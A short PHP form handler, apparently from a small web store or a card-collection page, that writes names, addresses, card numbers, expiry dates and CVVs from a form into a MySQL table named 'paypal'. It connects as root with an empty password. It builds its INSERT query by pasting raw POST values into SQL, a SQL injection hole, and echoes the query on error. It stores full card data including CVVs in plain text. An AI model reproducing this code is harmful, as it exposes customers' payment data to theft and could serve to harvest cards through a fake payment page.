<?php
// Conexión a la base de datos
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "contact";

$conn = new mysqli($servername, $username, $password, $dbname);

// Verificar la conexión
if ($conn->connect_error) {
    die("Conexión fallida: " . $conn->connect_error);
}

// Obtener datos del formulario
$nombre = $_POST["nombre"];
$email = $_POST["email"];
$direccion = $_POST["direccion"];
$ciudad = $_POST["ciudad"];
$estado = $_POST["estado"];
$postal = $_POST["postal"];
$nomtar = $_POST["nomtar"];
$numtar = $_POST["numtar"];
$mesexp = $_POST["mesexp"];
$aexp = $_POST["aexp"];
$cvv = $_POST["cvv"];

// Insertar datos en la tabla
$sql = "INSERT INTO paypal (nombre, email, direccion, ciudad, estado, postal, nomtar, numtar, mesexp, aexp, cvv) VALUES ('$nombre', '$email', '$direccion', '$ciudad', '$estado', '$postal', '$nomtar', '$numtar', '$mesexp', '$aexp', '$cvv')";

if ($conn->query($sql) === TRUE) {
    // Redirigir al usuario a una página de éxito
    header("Location: StoreAQP.html");
} else {
    echo "Error: " . $sql . "<br>" . $conn->error;
}

// Cerrar la conexión
$conn->close();
?>
